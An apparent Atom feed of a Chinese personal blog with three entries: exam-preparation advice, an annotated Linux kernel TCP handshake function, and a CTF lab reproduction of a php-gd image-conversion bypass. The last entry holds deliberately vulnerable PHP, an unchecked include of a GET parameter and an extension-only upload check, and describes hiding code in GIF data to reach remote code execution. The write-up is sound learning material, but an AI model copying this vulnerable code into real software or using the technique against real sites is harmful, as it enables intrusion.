<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Err0r</title>
  
  <subtitle>壮壮&#39; home</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://Err0rzz.github.io/"/>
  <updated>2019-04-10T04:46:58.535Z</updated>
  <id>http://Err0rzz.github.io/</id>
  
  <author>
    <name>Err0rzz</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>自闭考研</title>
    <link href="http://Err0rzz.github.io/2019/04/10/%E8%87%AA%E9%97%AD%E8%80%83%E7%A0%94/"/>
    <id>http://Err0rzz.github.io/2019/04/10/自闭考研/</id>
    <published>2019-04-10T04:39:07.000Z</published>
    <updated>2019-04-10T04:46:58.535Z</updated>
    
    <content type="html"><![CDATA[<p>感恩考研期间大家分享经验贴，自己也做个简单分享<br><a id="more"></a></p><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>先上分数吧<img src="https://upload-images.jianshu.io/upload_images/7513797-c7e8c776c2392ada.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><img src="https://upload-images.jianshu.io/upload_images/7513797-c235748ef320f0dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>好了，现在说话硬气了。<br>简单介绍一下自己情况，本科浙工商信安专业，报考东南大学网安学院学硕，数一英一916，初试第四，综合排名第三，进步<del>25%</del>(1名)，<del>毒圈苟进PALM实验室</del>（万一出意外，不能奶）。<br><br></p><h1 id="书籍推荐"><a href="#书籍推荐" class="headerlink" title="书籍推荐"></a>书籍推荐</h1><h2 id="政治"><a href="#政治" class="headerlink" title="政治"></a>政治</h2><p><strong>过 ！</strong><br>开个玩笑，还是要稍微过一遍课本，在考前一个月左右背一下肖四大题目的。选择题的话爱做不做（反正我做完了市面上所有的考研政治选择题，肖八三遍，肖四三遍，徐涛八套卷两遍，腿姐两遍，蒋中挺一遍，石磊一遍，然后你猜怎么着，选择题全寝室最低），所以说选择题这个东西练手可以，别抱太大希望，也别花太多时间。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">徐涛核心考案（亲，这边建议配合徐涛强化班视频一起食用，基础班可以不看）</div><div class="line">肖八、肖四（犹豫就会败北）</div></pre></td></tr></table></figure></p><p><br></p><h2 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h2><p>英语基础，emmm，别问，问就是过六级，还是6月份刚过的。一开始最担心的也是英语过不了线，是的，我英语目标一直到考试前一天都是过线。所以英语花的时间也是第二多的，仅次于数学。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">某剑阅读150啥的（吃灰，一篇没写过）</div><div class="line">啥作文书150啥的（吃灰，一篇没背过）</div><div class="line">真题 （无数遍）</div><div class="line">恋练有词（每天背背，视频不看）</div><div class="line">自己做真题的时候摘下来不会的单词小册子（每天一遍，背到最后一天）</div><div class="line">啥红宝书单词书（推荐，感觉恋练有词词汇量还是太少）</div></pre></td></tr></table></figure></p><p><br></p><h2 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h2><p>花的时间最多的一门课。因为考的数一，有高数、线代、概率论三门，难度依次下降。如果想考高分，建议多做模拟卷，计算量才是王道（参考19年数学），所以自己也很后悔当初太懒了，考试的时候大题目好几道答案都没算出来或者没算对。当然最重要的还是<strong>吃透</strong>真题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">张宇36讲（只做了高数18讲，线代概率论那18讲包装都没拆）</div><div class="line">复习全书（做了线代和概率论，高数部分没碰）</div><div class="line">李永乐线代辅导讲义（永乐大帝）</div><div class="line">张宇1000题（只做了ab组，感觉做不做都无所谓，不过前期练手也不错）</div><div class="line">660题（做了两遍）</div><div class="line">张宇的真题大全解（反复刷就vans了）</div><div class="line">超越卷（做了一套就没做了，太懒了）</div><div class="line">张宇劝退八套卷（做了一遍，计算量够大）</div><div class="line">张宇劝退四套卷（做了一套就不想做了）</div></pre></td></tr></table></figure></p><p><br></p><h2 id="专业课（916）"><a href="#专业课（916）" class="headerlink" title="专业课（916）"></a>专业课（916）</h2><p>因为就一门计网，所以相对简单，而且真的不用花太多时间，到后期，我基本上不知道该看什么=摸鱼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">计算机网络第7版以及课后答疑（指定教材）</div><div class="line">王道计网（刷了三遍，你说买不买）</div><div class="line">天勤计网（两遍，可买可不买）</div></pre></td></tr></table></figure></p><p><br></p><h1 id="时间安排"><a href="#时间安排" class="headerlink" title="时间安排"></a>时间安排</h1><p>首先 我要说的是，适合自己的才是最好的。尤其是关于早起这一点，别看到其他人早上5,6点钟起床了，你也跟着5,6点钟起床。别人可能早就习惯了早起，起的再早照样可以生龙活虎6个小时，而你呢，坐在那里发呆一早上，实际学习时间连2个小时都没有，那为什么不索性8点起床学4个小时呢，效率提升100%~<br>然后是计划安排，这个<strong>一定要有！一定要有！一定要有！</strong>每天要给自己定个计划，最好现在就开始定，怎么样的量才算合适呢，就是你的计划能覆盖到考前最后一天两天（那个时候基本上也不需要计划了，随缘吧）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">数学阶段性计划：</div><div class="line">4——7月：高数+线代+概率论过一遍</div><div class="line">7——9月：高数+线代+概率论过一遍</div><div class="line">9——10月：33年真题过一遍</div><div class="line">10——11月：模拟卷刷一遍</div><div class="line">11——12月：真题第二遍</div><div class="line">12——考前：真题错题笔记无数遍</div><div class="line">（这是我感觉不错的规划，我现在比较后悔的是当初在10——11月的时候懒得去做模拟卷还是在做真题</div><div class="line">所以计算量和计算速度没上来，最后考试的时候再一紧张，大题目算错和没算出来答案的有好几题）</div><div class="line"></div><div class="line">英语阶段性计划：</div><div class="line">4——7月：背完单词</div><div class="line">7——9月：做英语真题阅读部分，把不会的单词摘下来。背摘下来的单词和恋练有词</div><div class="line">9——11月：细做英语真题阅读部分（这个时候基本上全文所有单词都会了），背摘下来的单词和恋练有词</div><div class="line">11——12月：新题型和翻译，背摘下来的单词和恋练有词</div><div class="line">12——考前：作文（强推刘晓燕的保命班），背摘下来的单词和恋练有词</div><div class="line"></div><div class="line">政治阶段性计划：</div><div class="line">9——11月：过徐涛的强化班，肖秀荣1000题</div><div class="line">11——12月：疯狂刷模拟卷的选择题（正如我上面说的，真的可以不刷，拿出点时间给专业课吧）</div><div class="line">12——考前：背肖四</div><div class="line"></div><div class="line">专业课（916）：</div><div class="line">无......</div></pre></td></tr></table></figure></p><p>以上应该算阶段性计划，然后再在下面分每日计划。<strong>比如说，过课本的时候一天一章+对应习题和错题真题，做真题的时候每日一套+错题整理。</strong>这种时间安排需要自己去做，因为有人进度快有人进度慢，做了计划之后就不用去管别人的进度了，只要跟着自己的计划走就ok。而且在完成每日任务之后，也不用刻意说去做明天的任务，收拾收拾回寝室放松吧（所以我觉得自己考研期间放松的次数有点偏多…….而且还没有罪恶感……）。<br><strong>当然经常会遇到突发事情让你完成不了今天的任务，那你需要在当天规划好如何把今天的任务在不占用其他计划的前提下给完成。</strong>（别拖到最后计划全乱，做了计划跟没做一样，那没你好果汁吃）<br><br></p><h2 id="筑基-4月–6月"><a href="#筑基-4月–6月" class="headerlink" title="筑基(4月–6月)"></a>筑基(4月–6月)</h2><p>因为经历过高三的噩梦摧残，从大一刚入学我就秉持着一个观点：我就是找不到工作！从综合楼跳下去！也不会去考研的！！<br>然后在某潘性男子的怂恿下，清明节之后我的购物车里“张宇36讲就开始正在派送中”，真香~<br>这段时间我只看数学和背单词。每天的安排基本上就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">8：00——8：30：起床（起太早我感觉一早上都晕晕的，效率太低，不如索性找个适合自己的时间起床）</div><div class="line">8：30——12：00：到图书馆开始看张宇基础班视频且做笔记，一般一天一讲视频，看完做18讲对应例题和练习题（线代我看的李永乐基础班视频，做全书例题；概率论看张宇基础班视频，做全书例题）</div><div class="line">12：00——14：00：午饭，玩手机，午睡（不喜欢回寝室睡，因为床太舒服懒得起了）</div><div class="line">14：00——16：00：背单词，反复背，一般一天背一单元（因为考研英语除了作文需要写单词，其他都是选择题，所以只需要看到单词知道意思就可以，我一般都是挡住中文来快速反复过很多遍）</div><div class="line">16：00——17：00：看一下早上做的笔记，玩会手机</div><div class="line">17：00——18：00：吃饭，散步</div><div class="line">18：00——21：00：做今天视频对应章节的习题（早上没做完的+1000题a组）</div><div class="line">21：00：看错题（看完就走）</div><div class="line">回寝室之后洗漱完就开始放松（一般是打手游或者看电影，一般电影我都要分好几天才能看完，当时雷神3我看了三天才看完.......）</div><div class="line">11：30——12：00：上床玩手机</div><div class="line">12：00：睡觉</div></pre></td></tr></table></figure></p><p>这就是我做的每日计划，每个人根据自己的作息来制定就好了，只要能坚持就是好的。而且因为有课和参加了个作品赛要赶项目，所以经常会鸽，也不用太有负罪感和压力，只要最后完成了阶段性计划就ok了（所以说最重要的还是阶段性计划，每日计划只是为了让你在摸鱼的时候心态放好，有啥聚餐啊或者出去玩啊，去参加也无所谓的）。而且我每星期周日是在寝室宅一天的，做什么就不好意思说了，嘿嘿嘿~<br>我觉得复习期间，最重要的还是心态和效率，少发朋友圈给自己加戏，除了给自己一种自己很努力、自己很累的错觉，别无用处。<strong>只要最后大计划来得及，该玩还是可以玩，只要每日计划做完了，就赶紧离开图书馆吧，别为难自己。</strong>（反正我感觉自己也不是很累，也经常摸鱼QAQ）<br><br></p><h2 id="渡劫（7——9月）"><a href="#渡劫（7——9月）" class="headerlink" title="渡劫（7——9月）"></a>渡劫（7——9月）</h2><p>每周六天，周日休息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">8：00——8：30：起床</div><div class="line">8：30——12：00：到图书馆开始看张宇强化班视频且做笔记，一般一天一讲视频，看完做18讲对应例题</div><div class="line">（练习题不做了）（线代我看的李永乐强化班视频，做辅导讲义；概率论看张宇强化班视频，做全书例题）</div><div class="line">12：00——14：00：午饭，玩手机，午睡</div><div class="line">14：00——16：00：真题阅读部分，第一遍一天一篇，后面速度加快，摘下不会的单词</div><div class="line">16：00——17：00：背会单词，玩会手机</div><div class="line">17：00——18：00：吃饭，散步</div><div class="line">18：00——21：00：做660题（我是每天高数5题选填，线代概率论3题选填）</div><div class="line">21：00：看错题（看完就走）</div><div class="line">回寝室之后洗漱完就开始放松（一般是打手游或者看电影）</div><div class="line">11：30——12：00：上床玩手机</div><div class="line">12：00：睡觉</div></pre></td></tr></table></figure></p><p>这个时间段你会很无聊，因为校园里空无一人，我有时候看完错题就去操场跑个步什么的，然后回去的路上真的是一个人都没有……不过一回寝室就连麦开黑疯狂嘴臭，倒是也不会自闭……<br><br></p><h2 id="大乘（9月之后）"><a href="#大乘（9月之后）" class="headerlink" title="大乘（9月之后）"></a>大乘（9月之后）</h2><p>每周六天，周日休息（不过早上真题卷子我还是做完了再回寝室的），这段时间开始因为前中期基础打得牢，所以数学每天只用花三个小时，压力也变小了（我也变懒了，经常摸鱼……）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">8：30——9：00：起床</div><div class="line">9：00——12：00：标准一套数学真题（前面几年可能做得比较快一点，那就多检查几遍，反正到了12点才能走）</div><div class="line">12：00——14：00：午饭，玩手机，午睡</div><div class="line">14：00——16：00：真题阅读部分，一天四篇，摘下不会的单词</div><div class="line">16：00——17：00：背会单词，玩会手机</div><div class="line">17：00——18：00：吃饭，散步</div><div class="line">18：00——21：30：政治和专业课轮着（因为916就考一门计网，所以专业课相对轻松，如果考的专业课多的话，可能就需要挤压下午英语的时间了）</div><div class="line">21：30：看错题（看完就走）</div><div class="line">回寝室之后洗漱完就开始放松（一般是打手游或者看电影）</div><div class="line">11：30——12：00：上床玩手机</div><div class="line">12：00：睡觉</div></pre></td></tr></table></figure></p><p>越到后面明显感觉自己越学不进去，每天都想着玩，要稍微克制一下，我每次想回去打游戏的时候就会想着，马上周日了，就可以玩了，再坚持一下。所以前中期还是很关键的，只要前面做好了，后面就算稍微偷懒一下也无伤大雅，可是如果前面没做好，整体计划往后赶，再加上你后期学习效率低下，那你就凉透了~<br><br></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一年下来，感觉考研最重要的还<strong>心态和效率</strong>。<br>别给自己太多压力和太紧张的时间压迫，该玩还是可以玩的，只要事情做完了，打游戏都可以（认识我的应该都知道我最后两个月还是在打游戏，然后疯狂被嘴臭考不上了……）。<br>另一点就是效率，有时候你坐图书馆里坐一天，学习“13”个小时，看上去无比认真，不上清华都对不起你的一份努力。但是有多少时间是在发呆玩手机的，真正学习的时间又有多少，我是觉得与其“装模装样”，不如认认真真的学8个小时，只要每天都坚持，效果也很好的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感恩考研期间大家分享经验贴，自己也做个简单分享&lt;br&gt;
    
    </summary>
    
    
      <category term="考研" scheme="http://Err0rzz.github.io/tags/%E8%80%83%E7%A0%94/"/>
    
  </entry>
  
  <entry>
    <title>linux部分内核源码解析</title>
    <link href="http://Err0rzz.github.io/2018/06/15/linux%E9%83%A8%E5%88%86%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <id>http://Err0rzz.github.io/2018/06/15/linux部分内核源码解析/</id>
    <published>2018-06-15T14:30:36.000Z</published>
    <updated>2018-06-15T14:46:55.451Z</updated>
    
    <content type="html"><![CDATA[<p>对于三次握手协议中的第三次握手的验证报文的合法性源码的解析。<br><a id="more"></a></p><p><strong>tcp_check_req()</strong>来处理接收到的TCP段，判断是否是合法的TCP包。处理过程如下：</p><ol><li>解析并获取段中的TCP选项。</li><li>校验TCP序号。</li><li><strong>如果是SYN段，则作为SYN段再处理一次。</strong></li><li><strong>检测ACK段确认序号是否有效，无效则立即返回不作处理。</strong></li><li><strong>检测ACK段序号是否有效，无效则丢弃该段。</strong></li><li><strong>如果是RST段或者是新的SYN段，则向客户端返送RST段进行复位。</strong></li><li>校验通过，创建相应的“子”传输控制块。</li><li>连接请求块插入已完成的连接的队列中，等到用户进程的accept()调用。</li></ol><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">struct sock *tcp_check_req(struct sock *sk, struct sk_buff *skb, struct request_sock *req, struct request_sock **prev)  </div><div class="line">&#123;  </div><div class="line">struct tcp_options_received tmp_opt;  </div><div class="line">const struct tcphdr *th = tcp_hdr(skb);  /*获取段中的TCP选项*/</div><div class="line">__be32 flg = tcp_flag_word(th) &amp; (TCP_FLAG_RST | TCP_FLAG_SYN | TCP_FLAG_ACK);  /*获取TCP首部中的RST，SYN，ACK字段*/</div><div class="line">bool paws_reject = false;  </div><div class="line">      </div><div class="line">tmp_opt.saw_tstamp = 0;  </div><div class="line">if (th-&gt;doff &gt; (sizeof(struct tcphdr) &gt;&gt; 2)) &#123;  </div><div class="line">tcp_parse_options(skb, &amp;tmp_opt, 0, NULL);            </div><div class="line">if(tmp_opt.saw_tstamp) &#123;  /*判断TCP选项中是否带有时间戳*/</div><div class="line">tmp_opt.ts_recent = req-&gt;ts_recent;  /*记录该时间戳*/</div><div class="line">            tmp_opt.ts_recent_stamp = get_seconds() - ((TCP_TIMEOUT_INIT/HZ) &lt;&lt; req-&gt;retrans);  /*记录下有效时间*/</div><div class="line">            paws_reject = tcp_paws_reject(&amp;tmp_opt, th-&gt;rst); /*校验TCP序号是否有效*/</div><div class="line">        &#125;  </div><div class="line">&#125; </div><div class="line"></div><div class="line">    if (TCP_SKB_CB(skb)-&gt;seq == tcp_rsk(req)-&gt;rcv_isn &amp;&amp; flg == TCP_FLAG_SYN  </div><div class="line">        &amp;&amp; ! paws_reject) &#123;/*如果接收到的是客户端重发的SYN段，则作为SYN段处理*/  </div><div class="line">req-&gt;rsk_ops-&gt;rtx_syn_ack(sk, req, NULL);  /*调用连接请求，向客户端发送SYN+ACK，即重新握手*/</div><div class="line">        return NULL;  </div><div class="line">        &#125;  </div><div class="line"></div><div class="line">if ((flg &amp; TCP_FLAG_ACK) &amp;&amp; (TCP_SKB_CB(skb)-&gt;ack_seq !=   </div><div class="line">             tcp_rsk(req)-&gt;snt_isn + 1 + tcp_s_data_size(tcp_sk(sk))))        /* 如果接收段包含ACK标志，但确认序号不对，则返回“父”传输控制块，在上层函数处理 </div><div class="line">return sk; </div><div class="line">        /* 如果发生了回绕，或者接收序号不在接收窗口内 */</div><div class="line"></div><div class="line">if (paws_reject || ! tcp_in_window(TCP_SKB_CB(skb)-&gt;seq, TCP_SKB_CB(skb)-&gt;end_seq,  tcp_rsk(req)-&gt;rcv_isn + 1, tcp_rsk(req)-&gt;rcv_isn + 1 + req-&gt;rcv_wnd)) &#123;  /*如果ACK段序号无效或者序号不在接收窗口，则返回NULL，直接丢弃接收的段。*/             </div><div class="line">if (! (flg &amp; TCP_FLAG_RST))  /*判断是不是RST段*/</div><div class="line">req-&gt;rsk_ops-&gt;send_ack(sk, skb, req);  /*如果不是，则给对端发送ACK段*/</div><div class="line">if (paws_reject)  </div><div class="line">NET_INC_STATS_BH(sock_net(sk), LINUX_MIB_PAWSESTABREJECTED);  </div><div class="line">return NULL;  </div><div class="line">        &#125;   </div><div class="line"></div><div class="line">if (tmp_opt.saw_tstamp &amp;&amp; ! after(TCP_SKB_CB(skb)-&gt;seq, tcp_rsk(req)-&gt;rcv_isn + 1))  /*如果有时间戳选项，同时ACK段序号正常*/</div><div class="line">req-&gt;ts_recent = tmp_opt.rcv_tsval; /* 保存ACK段的时间戳 */ </div><div class="line"></div><div class="line">if (TCP_SKB_CB(skb)-&gt;seq == tcp_rsk(req)-&gt;rcv_isn) &#123;  /*如果ACK段的序号在接收窗口之外，则说明这是一个无效的SYN段*/</div><div class="line">flg &amp;= ~TCP_FLAG_SYN;  /*去掉SYN标志*/</div><div class="line">        &#125; </div><div class="line"></div><div class="line">if (flg &amp; (TCP_FLAG_RST | TCP_FLAG_SYN)) &#123;  /*如果段里有RST和SYN标志*/</div><div class="line">TCP_INC_STATS_BH(sock_net(sk), TCP_MIB_ATTEMPTFAILS);  /*统计一下*/</div><div class="line">goto embryonic_reset;  /*跳转到rest复位未连接完成的连接*/</div><div class="line">        &#125;   </div><div class="line"></div><div class="line">if (! (flg &amp; TCP_FLAG_ACK))  /*按照正常的流程，该段中应该有ACK标志，如果没有，则直接返回NULL，丢弃该段*/</div><div class="line">return NULL;</div><div class="line"></div><div class="line">if (tmp_opt.saw_tstamp &amp;&amp; tmp_opt.rcv_tsecr)  </div><div class="line">tcp_rsk(req)-&gt;snt_synack = tmp_opt.rcv_tsecr;  </div><div class="line">else if (req-&gt;retrans) </div><div class="line">tcp_rsk(req)-&gt;snt_synack = 0;  </div><div class="line"></div><div class="line">child = inet_csk(sk)-&gt;icsk_af_ops-&gt;syn_recv_sock(sk, skb, req, NULL);        </div><div class="line">if (child == NULL)  </div><div class="line">goto listen_overflow;  /*目前为止，第三次握手的ACK是有效的*/</div><div class="line"></div><div class="line">      </div><div class="line">inet_csk_reqsk_queue_unlink(sk, req, prev); /* 把连接请求块从半连接队列中删除 */  </div><div class="line">inet_csk_reqsk_queue_removed(sk, req); /* 更新半连接队列的长度，如果为0，则删除定时器 */  </div><div class="line">      </div><div class="line">inet_csk_reqsk_queue_add(sk, req, child);  /* 把完成三次握手的连接请求块，和新的sock关联起来，并把它移入全连接队列中 */  </div><div class="line">return child;  </div><div class="line">      </div><div class="line">    listen_overflow:  </div><div class="line">        if (! sysctl_tcp_abort_on_overflow) &#123;  </div><div class="line">            inet_rsk(req)-&gt;acked = 1;  </div><div class="line">            return NULL;  </div><div class="line">        &#125;</div><div class="line">/*如果是由于服务器繁忙或者其他原因导致连接建立失败，且未设置sysctl_tcp_abort_on_overflow，则设置连接请求块中的acked标志，表示已接收到作为第三次握手的ACK段。*/</div><div class="line"></div><div class="line"></div><div class="line">    embryonic_reset:  </div><div class="line">        NET_INC_STATS_BH(sock_net(sk), LINUX_MIB_EMBRYONICRSTS);  </div><div class="line">        if (! (flg &amp; TCP_FLAG_RST))  </div><div class="line">            req-&gt;rsk_ops-&gt;send_reset(sk, skb);  </div><div class="line">     </div><div class="line">        inet_csk_reqsk_queue_drop(sk, req, prev);  /* 把连接请求块从半连接队列中删除，更新半连接队列 */</div><div class="line">        return NULL;  </div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于三次握手协议中的第三次握手的验证报文的合法性源码的解析。&lt;br&gt;
    
    </summary>
    
    
      <category term="内核解析" scheme="http://Err0rzz.github.io/tags/%E5%86%85%E6%A0%B8%E8%A7%A3%E6%9E%90/"/>
    
      <category term="内核2.6.20" scheme="http://Err0rzz.github.io/tags/%E5%86%85%E6%A0%B82-6-20/"/>
    
  </entry>
  
  <entry>
    <title>imagecreatefrom_sctf2016</title>
    <link href="http://Err0rzz.github.io/2018/03/26/imagecreatefrom-sctf2016/"/>
    <id>http://Err0rzz.github.io/2018/03/26/imagecreatefrom-sctf2016/</id>
    <published>2018-03-26T08:44:57.000Z</published>
    <updated>2018-03-27T10:09:16.178Z</updated>
    
    <content type="html"><![CDATA[<p>看往年wp的时候看到了这么一个漏洞，感觉挺有意思就复现一下。</p><a id="more"></a><p>参考文档：<br><a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/54086.html</a><br><a href="https://www.hackersb.cn/hacker/123.html" target="_blank" rel="external">https://www.hackersb.cn/hacker/123.html</a></p><p>想去找找当时比赛的源码，但是好像并没有，无奈，只能自己写一份完成基本功能的代码了。<br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//error_reporting(0);</div><div class="line">if(isset($_GET[&apos;zz&apos;]))</div><div class="line">&#123;</div><div class="line">@include($_GET[&apos;zz&apos;]); </div><div class="line">&#125;</div><div class="line">else include(&apos;submit.php&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p><br><br>submit.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; </div><div class="line"></div><div class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">&lt;label for=&quot;file&quot;&gt;filename:&lt;/label&gt;</div><div class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</div><div class="line">&lt;/br&gt;</div><div class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">请上传jpg,gif,png文件，谢谢~</div></pre></td></tr></table></figure></p><p><br><br>upload.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">function get_random_string()&#123;</div><div class="line">    $random_string = &apos;&apos;;</div><div class="line">    $str = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890&quot;;</div><div class="line">    for($i = 0; $i &lt; 16; $i++)&#123;</div><div class="line">        $random_string .= substr($str, rand(1, 61), 1);</div><div class="line">    &#125;</div><div class="line">    return $random_string;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</div><div class="line">$uploaded_name=$_FILES[&apos;file&apos;][&apos;name&apos;];</div><div class="line">$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);</div><div class="line">if($uploaded_ext==&apos;jpg&apos;||$uploaded_ext==&apos;gif&apos;||$uploaded_ext==&apos;png&apos;)&#123;</div><div class="line">$target_path=&apos;./Err0r/&apos;.get_random_string().&apos;.&apos;.$uploaded_ext;</div><div class="line">if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path ))&#123;</div><div class="line"> echo &quot;&lt;script&gt; alert(&apos;move faild!&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;</div><div class="line">&#125;</div><div class="line">else&#123;</div><div class="line">                        if($uploaded_ext==&apos;jpg&apos;)</div><div class="line">                                $im =imagecreatefromjpeg($target_path);</div><div class="line">                        else if($uploaded_ext==&apos;gif&apos;)</div><div class="line">                                $im =imagecreatefromgif($target_path);</div><div class="line">else </div><div class="line">$im=imagecreatefrompng($target_path);</div><div class="line">                        if(!$im)&#123;</div><div class="line">                                echo &quot;&lt;script&gt; alert(&apos;jpg,png,gif Plz!&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;</div><div class="line">                                return ;</div><div class="line">                                &#125;</div><div class="line">                echo &quot;&lt;script&gt; alert(&apos;$target_path is moved successfully!&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;</div><div class="line">                return ;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">echo &quot;&lt;script&gt; alert(&apos;jpg,png,gif Plz!&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p><br><br><strong>对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行。</strong></p><p>然后根据poc改一下，得到以下gif<br><img 